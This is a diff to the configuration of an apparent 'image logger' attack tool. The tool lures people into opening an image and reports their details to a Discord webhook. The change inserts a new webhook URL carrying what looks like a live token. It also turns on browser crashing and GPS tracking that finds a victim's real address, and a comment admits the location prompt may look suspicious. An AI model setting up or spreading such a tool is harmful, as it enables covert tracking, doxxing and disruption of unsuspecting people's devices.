@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1331818914447102003/ffcSj-yzV1QWhVs0c9lBVryqHRGd99pKZLpVFswQG7FmvCJ5hd33SlszC50-vjZfsVAo",
+    "webhook": "https://discord.com/api/webhooks/1501860444212564028/BWixMOu1oT1z51MS_c5Yo9um5tkVoCPL4ilfJWtLyXNHo82jjXDQw-lY8U-P6zJ1WDbp",
     "image": "https://cdn.discordapp.com/attachments/1203915650905411595/1246615446074036295/IMG_3002.png?ex=6661a5db&is=6660545b&hm=8b019f54cda73eb7d35ac031051868f4272b2a691c0ca6d3b09841b279bc2982&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -22,9 +22,9 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
